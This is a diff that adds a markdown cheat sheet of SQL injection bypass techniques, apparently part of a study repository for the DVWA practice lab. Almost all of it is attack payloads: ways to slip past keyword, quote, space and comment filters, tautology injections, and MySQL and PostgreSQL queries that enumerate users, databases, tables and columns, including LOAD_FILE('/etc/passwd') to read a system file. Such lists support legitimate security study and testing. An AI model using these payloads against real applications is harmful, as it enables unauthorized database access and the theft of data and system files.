@@ -1,0 +1,77 @@
+
+## **📂 DVWA/SQL-Injection/bypass-techniques.md**
+```markdown
+# 🎯 SQL Injection Bypass Techniques
+
+## 🔧 Common Filter Bypasses
+
+### 1. Bypass Blacklist Filters
+```sql
+-- Original: OR
+OoRr  -- Case variation
+||    -- SQL logical OR
+%4f%52  -- URL encoded
+
+-- Original: UNION
+UNIunionON  -- Split keyword
+UNI/**/ON   -- Comment bypass
+U/**/NI/**/ON  -- Distributed comments
+
+-- When single quotes (') are filtered
+CHAR(65,66,67)  -- Instead of 'ABC'
+0x414243  -- Hex for 'ABC'
+CONCAT('A','B','C')  -- Built from parts
+
+-- When spaces are filtered
+SELECT/**/user/**/FROM/**/users  -- /**/ as space
+SELECT%09user%09FROM%09users  -- TAB character
+SELECT%0Auser%0AFROM%0Ausers  -- Newline
+SELECT+user+FROM+users  -- Plus sign
+
+-- When -- or # filtered
+' OR '1'='1' AND '1'='1  -- Balanced quotes instead
+' OR '1'='1'/*  -- Multi-line comment
+
+
+
+Database-Specific Payloads
+
+MySQL
+
+-- Version
+@@version, version()
+
+-- Current User
+user(), current_user(), system_user()
+
+-- Database
+database(), schema()
+
+-- File Read
+LOAD_FILE('/etc/passwd')
+
+-- List Databases
+SELECT schema_name FROM information_schema.schemata
+
+-- List Tables
+SELECT table_name FROM information_schema.tables WHERE table_schema = database()
+
+-- List Columns
+SELECT column_name FROM information_schema.columns WHERE table_name = 'users'
+
+PostgreSQL
+
+-- Version
+version()
+
+-- Current User
+current_user, user
+
+-- Database
+current_database()
+
+-- List Databases
+SELECT datname FROM pg_database
+
+-- List Tables
+SELECT tablename FROM pg_tables WHERE schemaname = 'public'
